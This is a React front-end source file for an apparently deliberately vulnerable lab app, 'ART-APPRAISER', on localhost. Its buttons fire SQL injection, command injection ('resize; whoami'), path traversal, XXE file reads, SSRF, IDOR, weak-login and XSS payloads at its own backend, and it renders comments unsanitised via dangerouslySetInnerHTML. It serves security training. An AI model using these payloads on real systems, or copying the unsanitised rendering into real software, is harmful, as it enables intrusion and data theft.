import React, { useEffect, useMemo, useState } from 'react';
import { createRoot } from 'react-dom/client';
import {
  Activity,
  Aperture,
  Braces,
  Command,
  DatabaseZap,
  FileSearch,
  Fingerprint,
  Gauge,
  ImageDown,
  KeyRound,
  LockKeyholeOpen,
  Network,
  Radar,
  ScanLine,
  ShieldAlert,
  Terminal,
  UserCog
} from 'lucide-react';
import './styles.css';

type Artwork = {
  id: number;
  title: string;
  artist: string;
  era: string;
  risk: string;
  confidence: number;
  ownerId: string;
};

type SecurityEvent = {
  timestamp: string;
  severity: string;
  vector: string;
  message: string;
};

type CommentRow = {
  id: number;
  artworkId: number;
  author: string;
  body: string;
};

const api = async <T,>(path: string, options?: RequestInit): Promise<T> => {
  const response = await fetch(path, {
    headers: { 'Content-Type': 'application/json', ...(options?.headers ?? {}) },
    credentials: 'include',
    ...options
  });
  if (!response.ok) {
    throw new Error(`${response.status} ${response.statusText}`);
  }
  return response.json() as Promise<T>;
};

function App() {
  const [artworks, setArtworks] = useState<Artwork[]>([]);
  const [events, setEvents] = useState<SecurityEvent[]>([]);
  const [selected, setSelected] = useState<Artwork | null>(null);
  const [query, setQuery] = useState("Nocturne");
  const [consoleOutput, setConsoleOutput] = useState('ART-APPRAISER telemetry online at http://localhost:9090');
  const [comments, setComments] = useState<CommentRow[]>([]);
  const [commentBody, setCommentBody] = useState('<img src=x onerror=alert("stored-xss")>');

  const refresh = async () => {
    const summary = await api<{ artworks: Artwork[]; events: SecurityEvent[] }>('/api/summary');
    setArtworks(summary.artworks);
    setEvents(summary.events);
    setSelected((current) => current ?? summary.artworks[0] ?? null);
  };

  const refreshEvents = async () => {
    const rows = await api<SecurityEvent[]>('/api/security-events');
    setEvents(rows);
  };

  useEffect(() => {
    refresh().catch((error) => setConsoleOutput(error.message));
    const timer = window.setInterval(() => refreshEvents().catch(() => undefined), 5000);
    return () => window.clearInterval(timer);
  }, []);

  useEffect(() => {
    if (!selected) return;
    api<CommentRow[]>(`/api/comments?artworkId=${selected.id}`)
      .then(setComments)
      .catch((error) => setConsoleOutput(error.message));
  }, [selected]);

  const confidence = selected?.confidence ?? 0;
  const riskClass = selected?.risk === 'forgery-risk' ? 'danger' : selected?.risk === 'watchlist' ? 'watch' : 'clear';

  const runSearch = async () => {
    const result = await api<{ query: string; matches: number; authenticSignal: boolean }>(`/api/search?q=${encodeURIComponent(query)}`);
    setConsoleOutput(`SQL filter result: query="${result.query}" matches=${result.matches} authenticSignal=${result.authenticSignal}`);
    refreshEvents();
  };

  const actionButtons = useMemo(() => [
    {
      label: 'SQL',
      icon: DatabaseZap,
      onClick: () => {
        setQuery("' OR '1'='1");
        window.setTimeout(runSearch, 10);
      }
    },
    {
      label: 'SLEEP',
      icon: Gauge,
      onClick: async () => {
        setQuery("Nocturne' OR SLEEP(2)--");
        const started = performance.now();
        await api(`/api/search?q=${encodeURIComponent("Nocturne' OR SLEEP(2)--")}`);
        setConsoleOutput(`Time-based SQLi probe latency ${(performance.now() - started).toFixed(0)}ms`);
        refreshEvents();
      }
    },
    {
      label: 'CMD',
      icon: Command,
      onClick: async () => {
        const data = await api<{ command: string; output: string }>('/api/transform', {
          method: 'POST',
          body: JSON.stringify({ imageName: 'lot-9090.jpg', operation: 'resize; whoami' })
        });
        setConsoleOutput(`${data.command}\n${data.output}`);
        refreshEvents();
      }
    },
    {
      label: 'PATH',
      icon: FileSearch,
      onClick: async () => {
        const data = await api<{ requested: string; content: string }>('/api/files?path=../pom.xml');
        setConsoleOutput(`${data.requested}\n${data.content.slice(0, 420)}`);
        refreshEvents();
      }
    },
    {
      label: 'XXE',
      icon: Braces,
      onClick: async () => {
        const xml = '<!DOCTYPE art [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]><art>&xxe;</art>';
        const data = await api<{ root: string; text: string }>('/api/metadata/xml', { method: 'POST', body: JSON.stringify({ xml }) });
        setConsoleOutput(`XML root=${data.root}\n${data.text}`);
        refreshEvents();
      }
    },
    {
      label: 'SSRF',
      icon: Network,
      onClick: async () => {
        const data = await api<{ bytesRead: number; preview: string }>('/api/external-image', {
          method: 'POST',
          body: JSON.stringify({ url: 'http://localhost:9090/api/security-events' })
        });
        setConsoleOutput(`SSRF bytes=${data.bytesRead}\n${data.preview}`);
        refreshEvents();
      }
    },
    {
      label: 'IDOR',
      icon: Fingerprint,
      onClick: async () => {
        const data = await api<Record<string, string>>('/api/reports/103?user=guest');
        setConsoleOutput(JSON.stringify(data, null, 2));
        refreshEvents();
      }
    },
    {
      label: 'BFLA',
      icon: UserCog,
      onClick: async () => {
        const data = await api('/api/admin/reindex?user=guest', { method: 'POST' });
        setConsoleOutput(JSON.stringify(data, null, 2));
        refreshEvents();
      }
    },
    {
      label: 'XSS',
      icon: ShieldAlert,
      onClick: async () => {
        const data = await api<{ renderedHtml: string }>(`/api/echo?frame=${encodeURIComponent('<svg onload=alert("reflected-xss")></svg>')}`);
        setConsoleOutput(data.renderedHtml);
        refreshEvents();
      }
    },
    {
      label: 'AUTH',
      icon: KeyRound,
      onClick: async () => {
        const data = await api('/api/auth/login', { method: 'POST', body: JSON.stringify({ username: 'guest', password: '1' }) });
        setConsoleOutput(JSON.stringify(data, null, 2));
        refreshEvents();
      }
    }
  ], [query]);

  const storeComment = async () => {
    if (!selected) return;
    await api('/api/comments', {
      method: 'POST',
      body: JSON.stringify({ artworkId: selected.id, author: 'Visitor', body: commentBody })
    });
    const rows = await api<CommentRow[]>(`/api/comments?artworkId=${selected.id}`);
    setComments(rows);
    refreshEvents();
  };

  return (
    <main className="app-shell">
      <header className="topbar">
        <div>
          <span className="eyebrow">GLOBAL GALLERY INTELLIGENCE</span>
          <h1>ART-APPRAISER</h1>
        </div>
        <div className="port-badge">
          <LockKeyholeOpen size={16} />
          <span>localhost:9090</span>
        </div>
      </header>

      <section className="dashboard-grid">
        <article className="viewer-panel">
          <div className="scan-stage">
            <div className="artwork-frame">
              <div className={`generative-art ${riskClass}`}>
                <span className="blue-plane" />
                <span className="red-thread" />
                <span className="cyan-orbit" />
              </div>
              <div className="scan-line" />
            </div>
            <div className="viewer-meta">
              <span>LOT {selected?.id ?? 0} / PRIVATE SALE</span>
              <h2>{selected?.title ?? 'Loading archive'}</h2>
              <p>{selected?.artist} · {selected?.era}</p>
            </div>
          </div>
        </article>

        <aside className="analysis-panel">
          <div className="panel-title">
            <Radar size={18} />
            <span>AI 감정 신뢰도</span>
          </div>
          <div className="confidence-ring" style={{ '--score': `${confidence * 3.6}deg` } as React.CSSProperties}>
            <div>
              <strong>{confidence}%</strong>
              <span>{selected?.risk}</span>
            </div>
          </div>
          <div className="metric-row"><span>Provenance</span><b>{confidence > 70 ? 'Verified' : 'Disputed'}</b></div>
          <div className="metric-row"><span>Threat</span><b className={riskClass}>{riskClass.toUpperCase()}</b></div>
          <div className="artwork-list">
            {artworks.map((artwork) => (
              <button key={artwork.id} className={selected?.id === artwork.id ? 'active' : ''} onClick={() => setSelected(artwork)}>
                <Aperture size={16} />
                <span>{artwork.title}</span>
                <b>{artwork.confidence}%</b>
              </button>
            ))}
          </div>
        </aside>

        <section className="control-panel">
          <div className="panel-title">
            <ScanLine size={18} />
            <span>취약점 시뮬레이션 콘솔</span>
          </div>
          <div className="search-row">
            <input value={query} onChange={(event) => setQuery(event.target.value)} />
            <button onClick={runSearch}>검색</button>
          </div>
          <div className="action-grid">
            {actionButtons.map(({ label, icon: Icon, onClick }) => (
              <button key={label} onClick={onClick} title={label}>
                <Icon size={17} />
                <span>{label}</span>
              </button>
            ))}
          </div>
          <div className="comment-lab">
            <textarea value={commentBody} onChange={(event) => setCommentBody(event.target.value)} />
            <button onClick={storeComment}><ImageDown size={16} />저장형 코멘트</button>
          </div>
        </section>

        <section className="terminal-panel">
          <div className="panel-title">
            <Terminal size={18} />
            <span>웹 서버 보안 이벤트 로그</span>
          </div>
          <pre>{consoleOutput}</pre>
          <div className="event-stream">
            {events.map((event, index) => (
              <div key={`${event.timestamp}-${index}`} className={`event ${event.severity.toLowerCase()}`}>
                <time>{new Date(event.timestamp).toLocaleTimeString()}</time>
                <b>{event.vector}</b>
                <span>{event.message}</span>
              </div>
            ))}
          </div>
        </section>

        <section className="stored-xss-panel">
          <div className="panel-title">
            <Activity size={18} />
            <span>컬렉터 코멘트 렌더러</span>
          </div>
          {comments.map((comment) => (
            <div className="comment-card" key={comment.id}>
              <strong>{comment.author}</strong>
              <div dangerouslySetInnerHTML={{ __html: comment.body }} />
            </div>
          ))}
        </section>
      </section>
    </main>
  );
}

createRoot(document.getElementById('root')!).render(<App />);
